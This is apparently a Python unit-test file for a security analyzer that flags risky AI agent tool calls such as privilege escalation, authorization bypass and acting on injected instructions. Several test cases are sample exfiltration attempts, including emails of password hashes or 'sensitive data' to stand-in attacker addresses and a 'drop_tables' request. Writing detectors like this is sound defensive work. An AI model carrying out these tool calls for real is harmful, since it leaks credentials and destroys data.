import unittest
from backend.tool_analyzer import ToolSecurityAnalyzer, ToolFinding

class TestToolSecurityAnalyzer(unittest.TestCase):
    def setUp(self):
        self.analyzer = ToolSecurityAnalyzer(
            trusted_tools={"send_email", "read_db", "fetch_weather", "admin_portal"},
            trusted_domains={"internal.corp", "allowed.org"}
        )

    def test_1_legitimate_tool_invocation(self):
        """1. Legitimate tool invocation -> BENIGN, no violations."""
        context = {
            "tool_name": "fetch_weather",
            "parameters": {"city": "New York"},
            "auth_status": "ALLOWED",
            "executed": True,
            "caller_role": "user"
        }
        res = self.analyzer.analyze_tool_invocation(context)
        self.assertEqual(res["verdict"], "BENIGN")
        self.assertEqual(len(res["findings"]), 0)
        self.assertEqual(res["authorization_state"], "EXECUTED")

    def test_2_unauthorized_tool_invocation(self):
        """2. Unauthorized tool invocation -> TOOL-001 (CRITICAL)."""
        context = {
            "tool_name": "admin_portal",
            "parameters": {"action": "drop_tables"},
            "auth_status": "DENIED",
            "executed": True,  # Executed despite DENIED
            "caller_role": "guest"
        }
        res = self.analyzer.analyze_tool_invocation(context)
        self.assertIn(res["verdict"], ["SECURITY_VIOLATION", "CONFIRMED_MALICIOUS"])
        rule_ids = [f["rule_id"] for f in res["findings"]]
        self.assertIn("TOOL-001", rule_ids)


    def test_3_privilege_escalation(self):
        """3. Privilege escalation -> TOOL-002."""
        context = {
            "tool_name": "admin_portal",
            "parameters": {"action": "reset_system"},
            "auth_status": "ALLOWED",
            "executed": True,
            "caller_role": "guest"  # Guest calling admin-only tool
        }
        res = self.analyzer.analyze_tool_invocation(context)
        self.assertEqual(res["verdict"], "SECURITY_VIOLATION")
        rule_ids = [f["rule_id"] for f in res["findings"]]
        self.assertIn("TOOL-002", rule_ids)

    def test_4_external_data_transfer(self):
        """4. External data transfer -> TOOL-004."""
        context = {
            "tool_name": "send_email",
            "parameters": {
                "to": "attacker@evil-external-domain.com",
                "body": "Weekly status update"
            },
            "auth_status": "ALLOWED",
            "executed": True,
            "caller_role": "user"
        }
        res = self.analyzer.analyze_tool_invocation(context)
        rule_ids = [f["rule_id"] for f in res["findings"]]
        self.assertIn("TOOL-004", rule_ids)

    def test_5_secret_passed_to_tool_redaction(self):
        """5. Secret passed to tool -> TOOL-005 (Secret must be redacted)."""
        raw_secret = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.secret12345"
        context = {
            "tool_name": "send_email",
            "parameters": {
                "to": "partner@internal.corp",
                "body": f"Here is the API key: {raw_secret}"
            },
            "auth_status": "ALLOWED",
            "executed": True,
            "caller_role": "user"
        }
        res = self.analyzer.analyze_tool_invocation(context)
        rule_ids = [f["rule_id"] for f in res["findings"]]
        self.assertIn("TOOL-005", rule_ids)
        # Check evidence redaction
        finding = next(f for f in res["findings"] if f["rule_id"] == "TOOL-005")
        self.assertNotIn("secret12345", finding["evidence"])
        self.assertIn("[REDACTED_API_KEY", finding["evidence"])

    def test_6_authorization_denial_no_unsafe_execution(self):
        """6. Authorization denial: Agent requests dangerous tool, authorization blocks it.
        Expected: No unsafe execution, authorization_state BLOCKED, drops to SUSPICIOUS at most.
        """
        context = {
            "tool_name": "send_email",
            "parameters": {
                "to": "exfil@evil.com",
                "body": "sensitive data payload"
            },
            "auth_status": "BLOCKED",
            "executed": False,
            "caller_role": "user"
        }
        res = self.analyzer.analyze_tool_invocation(context)
        self.assertEqual(res["authorization_state"], "BLOCKED")
        # Since it was blocked and NOT executed, it did not execute unsafely
        self.assertIn(res["verdict"], ["BENIGN", "SUSPICIOUS"])
        # No TOOL-007 or TOOL-009 or TOOL-001 violations
        rule_ids = [f["rule_id"] for f in res["findings"]]
        self.assertNotIn("TOOL-007", rule_ids)
        self.assertNotIn("TOOL-001", rule_ids)

    def test_7_authorization_bypass(self):
        """7. Authorization bypass: Policy says BLOCK, execution occurs anyway.
        Expected: TOOL-007 / SECURITY_VIOLATION or CONFIRMED_MALICIOUS.
        """
        context = {
            "tool_name": "read_db",
            "parameters": {"query": "SELECT * FROM users"},
            "auth_status": "BLOCKED",
            "policy_decision": "BLOCK",
            "executed": True,  # Executed despite policy saying BLOCK
            "caller_role": "user"
        }
        res = self.analyzer.analyze_tool_invocation(context)
        rule_ids = [f["rule_id"] for f in res["findings"]]
        self.assertIn("TOOL-007", rule_ids)
        self.assertIn(res["verdict"], ["SECURITY_VIOLATION", "CONFIRMED_MALICIOUS"])

    def test_8_false_positive_authorized_admin_operation(self):
        """8. False-positive scenario: Legitimate administrative operation by authorized admin.
        Expected: Non-malicious (BENIGN).
        """
        context = {
            "tool_name": "admin_portal",
            "parameters": {"action": "sync_users", "scope": "internal"},
            "auth_status": "ALLOWED",
            "executed": True,
            "caller_role": "admin"
        }
        res = self.analyzer.analyze_tool_invocation(context)
        self.assertEqual(res["verdict"], "BENIGN")
        self.assertEqual(len(res["findings"]), 0)

    def test_9_sequence_dangerous_tool_combination(self):
        """Test TOOL-003: read_secret -> send_external_message in sequence."""
        invocations = [
            {
                "tool_name": "read_db",
                "parameters": {"query": "SELECT password_hash FROM admin"},
                "auth_status": "ALLOWED",
                "executed": True,
                "caller_role": "admin"
            },
            {
                "tool_name": "send_email",
                "parameters": {"to": "external@attacker.com", "body": "hashes"},
                "auth_status": "ALLOWED",
                "executed": True,
                "caller_role": "admin"
            }
        ]
        res = self.analyzer.analyze_sequence(invocations)
        all_rules = [f["rule_id"] for item in res["invocation_analyses"] for f in item["findings"]] + [f["rule_id"] for f in res["sequence_findings"]]
        self.assertIn("TOOL-003", all_rules)

    def test_10_dangerous_action_following_untrusted_instruction(self):
        """Test TOOL-010: Untrusted instruction directly precedes dangerous tool invocation."""
        context = {
            "tool_name": "send_email",
            "parameters": {"to": "external@unknown.net", "body": "leak"},
            "auth_status": "ALLOWED",
            "executed": True,
            "caller_role": "user",
            "preceding_untrusted_source": "RAG document from untrusted web ingestion"
        }
        res = self.analyzer.analyze_tool_invocation(context)
        rule_ids = [f["rule_id"] for f in res["findings"]]
        self.assertIn("TOOL-010", rule_ids)


if __name__ == "__main__":
    unittest.main()
